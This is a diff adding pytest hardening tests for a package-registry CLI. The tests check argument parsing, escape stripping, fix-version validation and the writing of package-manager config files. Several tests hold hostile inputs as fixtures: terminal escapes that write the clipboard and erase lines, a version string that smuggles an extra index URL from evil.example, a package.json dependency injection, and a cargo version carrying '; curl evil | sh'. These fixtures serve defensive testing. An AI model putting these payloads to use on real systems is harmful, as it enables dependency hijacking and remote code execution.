@@ -1,0 +1,589 @@
+"""CLI: argument parsing, terminal output and config writing hardening.
+
+The HTTP layer is stubbed (`cli.api`), so these pin the CLI's own behaviour:
+what it accepts on the command line, what it prints from server-supplied
+text, and what it writes into the user's package-manager config files.
+"""
+
+from __future__ import annotations
+
+import argparse
+import configparser
+import importlib.util
+import io
+import json
+import pathlib
+import re
+import shlex
+import stat
+import sys
+import tomllib
+import urllib.error
+
+import pytest
+
+ROOT = pathlib.Path(__file__).resolve().parents[2]
+CLI_PATH = ROOT / "cli" / "minireg.py"
+_spec = importlib.util.spec_from_file_location("minireg_cli_hardening", CLI_PATH)
+cli = importlib.util.module_from_spec(_spec)
+sys.modules["minireg_cli_hardening"] = cli
+_spec.loader.exec_module(cli)
+
+
+# --------------------------------------------------------------------------- #
+# Every documented command line parses
+# --------------------------------------------------------------------------- #
+_SHELL_FENCES = ("```bash", "```sh", "```shell", "```console")
+
+
+def _shell_blocks(text: str):
+    """The bodies of the shell code blocks in a markdown file."""
+    block: list[str] | None = None
+    for line in text.splitlines():
+        if line.startswith("```"):
+            if block is None and line.strip() in _SHELL_FENCES:
+                block = []
+            elif block is not None:
+                yield "\n".join(block)
+                block = None
+            # Any other fence opens or closes a non-shell block; its body is
+            # skipped because `block` stays None until the next shell fence.
+        elif block is not None:
+            block.append(line)
+
+
+def documented_command_lines() -> list[str]:
+    """`minireg ...` invocations from the docs, the README, the parser's own
+    epilog and the hints the CLI prints when it gives up."""
+    found: list[str] = []
+    for doc in sorted([*(ROOT / "docs").glob("*.md"), ROOT / "README.md"]):
+        for block in _shell_blocks(doc.read_text()):
+            for line in block.replace("\\\n", " ").splitlines():
+                line = line.strip().removeprefix("$ ")
+                for part in re.split(r"&&|\|\||;|\|", line):
+                    part = part.strip()
+                    if part.startswith("minireg "):
+                        found.append(part)
+    for line in (cli.build_parser().epilog or "").splitlines():
+        if line.strip().startswith("minireg "):
+            found.append(line.strip())
+    # Hints such as "Run: minireg login --url https://registry.example.com".
+    found += re.findall(r"Run: (minireg [^\"'\n]+)", CLI_PATH.read_text())
+    return found
+
+
+def test_the_documented_commands_were_found():
+    lines = documented_command_lines()
+    # The ones that used to be rejected, so a broken extractor cannot pass
+    # the parse test below by finding nothing.
+    assert "minireg login --url https://registry.example.com" in lines
+    assert any(line.startswith("minireg audit --refresh") for line in lines)
+    assert len(lines) > 30
+
+
+@pytest.mark.parametrize("line", documented_command_lines())
+def test_every_documented_command_parses(line):
+    argv = shlex.split(line, comments=True)[1:]
+    try:
+        cli.build_parser().parse_args(argv)
+    except SystemExit as exc:  # argparse's way of saying "unrecognised"
+        pytest.fail(f"{line!r} does not parse (exit {exc.code})")
+
+
+class TestGlobalFlagsAfterTheCommand:
+    def test_url_and_insecure_follow_any_command(self):
+        p = cli.build_parser()
+        a = p.parse_args(["login", "--url", "https://reg.example", "--insecure"])
+        assert a.url == "https://reg.example" and a.insecure is True
+        a = p.parse_args(["audit", "--insecure"])
+        assert a.insecure is True
+
+    def test_a_subcommand_does_not_reset_the_top_level_values(self):
+        """The subcommand's copies default to SUPPRESS: without that, a bare
+        `minireg --url X whoami` would come back with url=None."""
+        a = cli.build_parser().parse_args(["--url", "https://reg.example", "--insecure", "whoami"])
+        assert a.url == "https://reg.example" and a.insecure is True
+        a = cli.build_parser().parse_args(["whoami"])
+        assert a.url is None and a.insecure is False
+
+    def test_login_uses_the_url_given_after_the_command(self, monkeypatch, tmp_path):
+        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
+        monkeypatch.delenv("MINIREG_URL", raising=False)
+        seen = []
+
+        def fake_api(registry, path, *a, **k):
+            seen.append(registry)
+            raise cli.ApiError(0, "stop here")
+
+        monkeypatch.setattr(cli, "api", fake_api)
+        args = cli.build_parser().parse_args(["login", "--url", "https://reg.example/"])
+        with pytest.raises(SystemExit):
+            args.func(args)
+        assert seen == ["https://reg.example"]
+
+
+class TestAuditRefresh:
+    def test_refresh_is_sent_to_the_server(self, monkeypatch):
+        bodies = []
+
+        def fake_api(registry, path, method="GET", body=None, **kwargs):
+            bodies.append(body)
+            return {"checked": 1, "findings": [], "unscanned": [], "unscanned_total": 0}
+
+        monkeypatch.setattr(cli, "api", fake_api)
+        pkgs = [{"name": "a", "version": "1.0.0"}]
+        args = cli.build_parser().parse_args(["audit", "--refresh"])
+        cli.audit_request("http://reg", "t", "npm", pkgs, args)
+        args = cli.build_parser().parse_args(["audit"])
+        cli.audit_request("http://reg", "t", "npm", pkgs, args)
+        assert [b["refresh"] for b in bodies] == [True, False]
+
+    def test_refresh_and_offline_contradict_each_other(self):
+        with pytest.raises(SystemExit):
+            cli.build_parser().parse_args(["audit", "--offline", "--refresh"])
+
+
+# --------------------------------------------------------------------------- #
+# Server-supplied text cannot drive the terminal
+# --------------------------------------------------------------------------- #
+#: OSC 52 (write the clipboard), then erase the line and return to its start,
+#: then the 8-bit CSI form. A terminal shown this prints only "looks fine".
+EVIL = "harmless\x1b]52;c;Y3VybCBldmlsfHNo\x07\x1b[2K\r\x9b2Klooks fine"
+
+
+class _Response:
+    def __init__(self, payload):
+        self._body = json.dumps(payload).encode()
+        self.headers = {}
+
+    def read(self):
+        return self._body
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        return False
+
+
+@pytest.fixture
+def server(monkeypatch, tmp_path):
+    """Serve canned JSON through the CLI's real `api()`, from urlopen down."""
+    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
+    monkeypatch.delenv("MINIREG_TOKEN", raising=False)
+    monkeypatch.delenv("MINIREG_URL", raising=False)
+    cli.save_config({"registry": "https://reg.example", "token": "t"})
+    routes = {}
+
+    def fake_urlopen(request, timeout=None, context=None):
+        path = request.full_url.split("reg.example", 1)[1]
+        for prefix, answer in routes.items():
+            if path.startswith(prefix):
+                if isinstance(answer, Exception):
+                    raise answer
+                return _Response(answer)
+        raise AssertionError(f"unexpected request {path}")
+
+    monkeypatch.setattr(cli.urllib.request, "urlopen", fake_urlopen)
+    return routes
+
+
+def assert_inert(text):
+    assert "\x1b" not in text and "\x9b" not in text and "\r" not in text and "\x07" not in text
+
+
+class TestNoTerminalEscapes:
+    def test_search_descriptions(self, server, capsys):
+        server["/api/docker/images"] = {"images": [], "total": 0}
+        server["/api/search"] = {
+            "total": 1,
+            "results": [
+                {"ecosystem": "npm", "name": "evil-pkg", "latest_version": "1.0.0", "description": EVIL}
+            ],
+        }
+        cli.main(["search", "evil"])
+        out = capsys.readouterr().out
+        assert_inert(out)
+        assert "looks fine" in out
+
+    def test_info_block_reason_and_cves_cannot_hide_lines(self, server, capsys):
+        server["/api/packages/npm/evil"] = {
+            "name": "evil",
+            "ecosystem": "npm",
+            "description": "multi\nline " + EVIL,
+            "license": "MIT\x1b[8m",
+            "blocked": True,
+            "block_reason": "malware\x1b[1A\x1b[2K",
+            "versions": [
+                {"version": "1.0.0", "max_cvss": 9.8, "cves": [{"cve_id": "CVE-1\x1b]0;pwned\x07"}]},
+            ],
+            "upstreams": [{"name": "npmjs\x1b[2K", "web_url": "https://x\x1b[2K"}],
+        }
+        cli.main(["info", "evil", "--ecosystem", "npm"])
+        out = capsys.readouterr().out
+        assert_inert(out)
+        assert "BLOCKED" in out and "malware" in out
+        # A newline in a one-line field would forge a line of output.
+        assert "multi line" in out
+
+    def test_image_findings(self, server, capsys):
+        server["/api/docker/inspect"] = {
+            "pull_reference": "reg.example/evil:1\x1b[2K",
+            "repository": "evil",
+            "digest": "sha256:" + "a" * 64,
+            "image": {
+                "digest": "sha256:" + "a" * 64,
+                "scan_status": "scanned",
+                "severity_counts": {"HIGH": 1},
+                "kind": "image",
+            },
+            "verdict": {"allowed": False, "code": "DENIED", "reason": "critical CVE\x1b[1A\x1b[2K"},
+            "findings": [
+                {"severity": "HIGH", "vuln_id": "CVE-2\x1b]52;c;eA==\x07", "pkg_name": "openssl\r",
+                 "installed_version": "1", "fixed_version": "2\x1b[2K"},
+            ],
+            "findings_total": 1,
+        }
+        cli.main(["info", "--ecosystem", "docker", "evil:1"])
+        out = capsys.readouterr().out
+        assert_inert(out)
+        assert "BLOCKED" in out
+
+    def test_error_details(self, server, capsys):
+        body = io.BytesIO(b"<html>\x1b]52;c;eA==\x07 down</html>")
+        server["/api/search"] = urllib.error.HTTPError(
+            "https://reg.example/api/search", 502, "Bad Gateway", {}, body
+        )
+        server["/api/docker/images"] = {"images": [], "total": 0}
+        with pytest.raises(SystemExit):
+            cli.main(["search", "x", "--ecosystem", "npm"])
+        err = capsys.readouterr().err
+        assert_inert(err)
+        assert "down" in err
+
+    def test_multiline_fields_keep_their_lines(self):
+        payload = cli._clean_payload(
+            {"containerd_hosts_toml": "[host]\r\n  a = 1\x1b[2K\n", "note": "a\nb"}
+        )
+        assert payload == {"containerd_hosts_toml": "[host]\n  a = 1[2K\n", "note": "a b"}
+
+
+# --------------------------------------------------------------------------- #
+# --fix never writes a malformed version
+# --------------------------------------------------------------------------- #
+INJECTED_PYPI = "2.31.0\n--extra-index-url https://evil.example/simple"
+INJECTED_NPM = '4.17.21", "evil": "git+https://evil.example/x.git'
+
+
+class TestFixVersionsAreValidated:
+    def test_requirements_line_injection_is_refused(self, tmp_path):
+        req = tmp_path / "requirements.txt"
+        req.write_text("requests==2.19.0\n")
+        text, changes = cli.plan_requirements_fix(req, {"requests": INJECTED_PYPI})
+        assert text == "requests==2.19.0\n" and changes == []
+
+    def test_package_json_key_injection_is_refused(self, tmp_path):
+        pj = tmp_path / "package.json"
+        original = '{\n  "dependencies": {\n    "lodash": "^4.17.0"\n  }\n}\n'
+        pj.write_text(original)
+        text, changes, _skipped = cli.plan_package_json_fix(pj, {"lodash": INJECTED_NPM})
+        assert text == original and changes == []
+
+    def test_valid_versions_still_apply(self, tmp_path):
+        req = tmp_path / "requirements.txt"
+        req.write_text("requests==2.19.0\nDjango==4.2\n")
+        text, changes = cli.plan_requirements_fix(req, {"requests": "2.31.0", "django": "4.2.post1"})
+        assert text == "requests==2.31.0\nDjango==4.2.post1\n" and len(changes) == 2
+
+    def test_apply_fixes_writes_nothing_malformed(self, tmp_path, capsys, monkeypatch):
+        req = tmp_path / "requirements.txt"
+        req.write_text("requests==2.19.0\n")
+        monkeypatch.setattr(cli, "verify_fixes", lambda *a: [])
+        findings = [{"name": "requests", "version": "2.19.0", "fix_version": INJECTED_PYPI, "cves": [{}]}]
+        args = argparse.Namespace(dry_run=False, yes=True, insecure=False)
+        cli.apply_fixes(args, "https://reg.example", "t", tmp_path, [(req, "pypi", findings)])
+        assert req.read_text() == "requests==2.19.0\n"
+        assert "malformed fix version" in capsys.readouterr().err
+
+    def test_cargo_advice_never_prints_a_command_injection(self, tmp_path, capsys):
+        printed = cli._print_cargo_fix_advice(
+            tmp_path / "Cargo.lock",
+            [
+                {"name": "time", "fix_version": "0.3.47; curl evil | sh", "cves": [{}]},
+                {"name": "smallvec", "fix_version": "1.6.1", "cves": [{}]},
+            ],
+        )
+        out = capsys.readouterr().out
+        assert printed == 1
+        assert "curl" not in out and "cargo update -p smallvec --precise 1.6.1" in out
+
+
+class TestServerDropsMalformedFixVersions:
+    def test_lowest_clearing_version_skips_unparseable_fixes(self):
+        from app.services.vulns import lowest_clearing_version
+
+        cves = [{"fixed_version": INJECTED_PYPI}, {"fixed_version": "2.30.0"}]
+        assert lowest_clearing_version("pypi", cves, "2.19.0") == "2.30.0"
+        assert lowest_clearing_version("npm", [{"fixed_version": INJECTED_NPM}], "4.17.0") is None
+        assert lowest_clearing_version("cargo", [{"fixed_version": "1.0.0\n"}], "0.9.0") is None
+        assert lowest_clearing_version("npm", [{"fixed_version": "4.17.21"}], "4.17.0") == "4.17.21"
+
+
+# --------------------------------------------------------------------------- #
+# --fix reports what it did not change honestly
+# --------------------------------------------------------------------------- #
+def run_fix(tmp_path, monkeypatch, source, ecosystem, findings, dry_run=False):
+    monkeypatch.setattr(cli, "verify_fixes", lambda *a: [])
+    args = argparse.Namespace(dry_run=dry_run, yes=True, insecure=False)
+    cli.apply_fixes(args, "https://reg.example", "t", tmp_path, [(source, ecosystem, findings)])
+
+
+def finding(name, version, fix):
+    return {"name": name, "version": version, "fix_version": fix, "cves": [{"cve_id": "CVE-X"}]}
+
+
+class TestFixReportsHonestly:
+    @pytest.mark.parametrize(
+        "lockfile, command",
+        [
+            ("poetry.lock", 'poetry add "requests>=2.31.0"'),
+            ("uv.lock", 'uv lock --upgrade-package "requests==2.31.0"'),
+            ("Pipfile.lock", 'pipenv upgrade "requests>=2.31.0"'),
+        ],
+    )
+    def test_tool_owned_lockfiles_get_the_tools_command(
+        self, tmp_path, monkeypatch, capsys, lockfile, command
+    ):
+        lock = tmp_path / lockfile
+        lock.write_text('[[package]]\nname = "requests"\nversion = "2.19.0"\n')
+        run_fix(tmp_path, monkeypatch, lock, "pypi", [finding("requests", "2.19.0", "2.31.0")])
+        out = capsys.readouterr()
+        assert command in out.out
+        assert "already at or above" not in out.out + out.err
+        assert "nothing to change" not in out.out
+        assert lock.read_text() == '[[package]]\nname = "requests"\nversion = "2.19.0"\n'
+
+    def test_a_higher_pin_is_not_downgraded(self, tmp_path, monkeypatch, capsys):
+        req = tmp_path / "requirements.txt"
+        req.write_text("requests==2.32.3\n")
+        run_fix(tmp_path, monkeypatch, req, "pypi", [finding("requests", "2.32.3", "2.31.0")])
+        assert req.read_text() == "requests==2.32.3\n"
+        assert "already at or above the fixed version: requests==2.32.3" in capsys.readouterr().out
+
+    def test_pep440_comparison(self):
+        assert cli.version_at_least("pypi", "2.31", "2.31.0") is True
+        assert cli.version_at_least("pypi", "2.31.0rc1", "2.31.0") is False
+        assert cli.version_at_least("pypi", "2.31.0.post1", "2.31.0") is True
+        assert cli.version_at_least("pypi", "2.31.0.dev1", "2.31.0a1") is False
+        assert cli.version_at_least("pypi", "10.0", "9.9") is True
+        assert cli.version_at_least("npm", "1.0.0-beta.2", "1.0.0") is False
+        assert cli.version_at_least("npm", "1.0.0-beta.11", "1.0.0-beta.2") is True
+        assert cli.version_at_least("pypi", "weird", "1.0") is None
+
+    def test_a_range_is_reported_not_called_fixed(self, tmp_path, monkeypatch, capsys):
+        req = tmp_path / "requirements.txt"
+        req.write_text("requests>=2.0\n")
+        run_fix(tmp_path, monkeypatch, req, "pypi", [finding("requests", "2.19.0", "2.31.0")])
+        out = capsys.readouterr()
+        assert "already at or above" not in out.out
+        assert "no exact pin" in out.err and "requests>=2.31.0" in out.err
+
+    def test_a_pin_in_an_included_file_is_rewritten_there(self, tmp_path, monkeypatch, capsys):
+        req = tmp_path / "requirements.txt"
+        req.write_text("-r common.txt\nflask==3.0.0\n")
+        common = tmp_path / "common.txt"
+        common.write_text("requests==2.19.0  # shared\n")
+        run_fix(tmp_path, monkeypatch, req, "pypi", [finding("requests", "2.19.0", "2.31.0")])
+        assert common.read_text() == "requests==2.31.0  # shared\n"
+        assert req.read_text() == "-r common.txt\nflask==3.0.0\n"
+        out = capsys.readouterr().out
+        assert str(common) in out and "already at or above" not in out
+
+    def test_npm_transitive_and_higher_declarations(self, tmp_path, monkeypatch, capsys):
+        lock = tmp_path / "package-lock.json"
+        lock.write_text("{}")
+        pj = tmp_path / "package.json"
+        original = '{"dependencies": {"vite": "^6.0.0"}}'
+        pj.write_text(original)
+        run_fix(
+            tmp_path,
+            monkeypatch,
+            lock,
+            "npm",
+            [finding("vite", "6.0.0", "5.4.6"), finding("minimist", "1.2.5", "1.2.6")],
+        )
+        assert pj.read_text() == original  # never lowered to ^5.4.6
+        out = capsys.readouterr()
+        assert "already at or above the fixed version: vite ^6.0.0" in out.out
+        assert "not declared" in out.err and "minimist>=1.2.6" in out.err
+
+
+# --------------------------------------------------------------------------- #
+# configure: what lands in the package managers' config files
+# --------------------------------------------------------------------------- #
+PUBLIC = "https://public.example"
+
+
+@pytest.fixture
+def home(monkeypatch, tmp_path):
+    """A scratch HOME/XDG/CARGO_HOME, a stored login, and a server whose
+    PUBLIC_URL differs from the address the CLI was given."""
+    monkeypatch.setenv("HOME", str(tmp_path))
+    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / ".config"))
+    monkeypatch.setenv("CARGO_HOME", str(tmp_path / ".cargo"))
+    monkeypatch.delenv("MINIREG_TOKEN", raising=False)
+    monkeypatch.delenv("MINIREG_URL", raising=False)
+    cli.save_config({"registry": "http://localhost:5055", "token": "mrg_tok"})
+
+    def fake_api(registry, path, *a, **k):
+        assert path == "/api/client-config"
+        return {
+            "npm": {"registry": f"{PUBLIC}/npm/"},
+            "pip": {"index_url": f"{PUBLIC}/pypi/simple/"},
+            "cargo": {"registry": f"sparse+{PUBLIC}/cargo/index/"},
+        }
+
+    monkeypatch.setattr(cli, "api", fake_api)
+    return tmp_path
+
+
+def configure(target):
+    assert cli.main(["configure", target]) == 0
+
+
+def pip_conf(home):
+    return home / ".config" / "pip" / "pip.conf"
+
+
+def parsed_pip_conf(home):
+    # pip reads it with RawConfigParser, which is strict: a duplicate
+    # section or option is an error that breaks pip entirely.
+    conf = configparser.RawConfigParser()
+    conf.read(pip_conf(home))
+    return conf
+
+
+class TestConfigureUsesTheGivenAddress:
+    def test_npm_registry_and_token_name_the_same_host(self, home):
+        configure("npm")
+        npmrc = (home / ".npmrc").read_text()
+        assert "registry=http://localhost:5055/npm/" in npmrc
+        assert "//localhost:5055/npm/:_authToken=mrg_tok" in npmrc
+        assert "public.example" not in npmrc
+
+    def test_pip_index_is_the_given_address(self, home):
+        configure("pip")
+        url = parsed_pip_conf(home).get("global", "index-url")
+        assert url == "http://__token__:mrg_tok@localhost:5055/pypi/simple/"
+
+    def test_cargo_index_is_the_given_address(self, home):
+        configure("cargo")
+        text = (home / ".cargo" / "config.toml").read_text()
+        assert "sparse+http://localhost:5055/cargo/index/" in text
+        assert "public.example" not in text
+
+
+OLD_BLOCK_IN_FREEZE = (
+    "[global]\ntimeout = 60\n\n[freeze]\nall = true\n"
+    "# >>> minireg >>>\nindex-url = http://old/pypi/simple/\n# <<< minireg <<<\n"
+)
+
+
+class TestPipConfLandsUnderGlobal:
+    INDEX = "http://__token__:mrg_tok@localhost:5055/pypi/simple/"
+
+    @pytest.mark.parametrize(
+        "layout",
+        [
+            "",
+            "[global]\ntimeout = 60\n\n[freeze]\nall = true\n",
+            "[install]\nno-compile = true\n",
+            "[freeze]\nall = true\n[global]\ntimeout = 60",
+            "; comment\n[global]\n\n[install]\nuser = false\n[freeze]\nall = true\n",
+            OLD_BLOCK_IN_FREEZE,  # what an older CLI left behind
+        ],
+    )
+    def test_index_url_parses_under_global(self, home, layout):
+        path = pip_conf(home)
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(layout)
+        configure("pip")
+        conf = parsed_pip_conf(home)
+        assert conf.get("global", "index-url") == self.INDEX
+        assert conf.get("global", "trusted-host") == "localhost"
+        for section in conf.sections():
+            if section != "global":
+                assert not conf.has_option(section, "index-url"), section
+        if "timeout" in layout:
+            assert conf.get("global", "timeout") == "60"
+
+        once = path.read_text()
+        configure("pip")
+        assert path.read_text() == once  # idempotent
+        assert once.count("# >>> minireg >>>") == 1
+
+    def test_users_own_index_url_is_not_duplicated(self, home, capsys):
+        """A second index-url in [global] is a DuplicateOptionError, and pip
+        then ignores its whole config. Leave the file as it is and say so."""
+        path = pip_conf(home)
+        path.parent.mkdir(parents=True, exist_ok=True)
+        original = "[global]\nindex_url = https://pypi.org/simple/\n[freeze]\nall = true\n"
+        path.write_text(original)
+        configure("pip")
+        assert path.read_text() == original
+        assert "already sets index_url" in capsys.readouterr().err
+
+
+OLD_CARGO_BLOCK = (
+    '[build]\njobs = 4\n\n# >>> minireg >>>\n[source.crates-io]\nreplace-with = "minireg"\n\n'
+    '[source.minireg]\nregistry = "sparse+http://old/cargo/index/"\n# <<< minireg <<<\n'
+)
+
+
+class TestCargoCredential:
+    """With ALLOW_ANONYMOUS_READ=false cargo must send a token. It only does
+    so for a `[registries]` entry with a credential provider (checked against
+    cargo 1.9x: a `[source.minireg]` replacement fails with "authenticated
+    registries require a credential-provider"), and only to an index whose
+    config.json declares auth-required, so writing it is harmless otherwise."""
+
+    def cargo_files(self, home):
+        return home / ".cargo" / "config.toml", home / ".cargo" / "credentials.toml"
+
+    def test_registry_entry_and_token_are_written(self, home):
+        conf_path, creds_path = self.cargo_files(home)
+        creds_path.parent.mkdir(parents=True)
+        creds_path.write_text('[registry]\ntoken = "crates-io-token"\n')
+        conf_path.write_text(OLD_CARGO_BLOCK)
+        configure("cargo")
+
+        conf = tomllib.loads(conf_path.read_text())
+        assert conf["build"] == {"jobs": 4}
+        assert conf["source"] == {"crates-io": {"replace-with": "minireg"}}
+        assert conf["registries"]["minireg"] == {
+            "index": "sparse+http://localhost:5055/cargo/index/",
+            "credential-provider": "cargo:token",
+        }
+        creds = tomllib.loads(creds_path.read_text())
+        assert creds == {"registry": {"token": "crates-io-token"}, "registries": {"minireg": {"token": "mrg_tok"}}}
+        assert stat.S_IMODE(creds_path.stat().st_mode) == 0o600
+
+        before = (conf_path.read_text(), creds_path.read_text())
+        configure("cargo")
+        assert (conf_path.read_text(), creds_path.read_text()) == before
+
+    def test_no_token_no_credentials_file(self, home):
+        cli.save_config({"registry": "http://localhost:5055"})
+        configure("cargo")
+        _conf, creds_path = self.cargo_files(home)
+        assert not creds_path.exists()
+
+    def test_an_existing_table_is_not_defined_twice(self, home, capsys):
+        conf_path, creds_path = self.cargo_files(home)
+        creds_path.parent.mkdir(parents=True)
+        original = '[registries.minireg]\ntoken = "mine"\n'
+        creds_path.write_text(original)
+        configure("cargo")
+        assert creds_path.read_text() == original
+        assert not conf_path.exists()
+        assert "already has [registries.minireg]" in capsys.readouterr().err
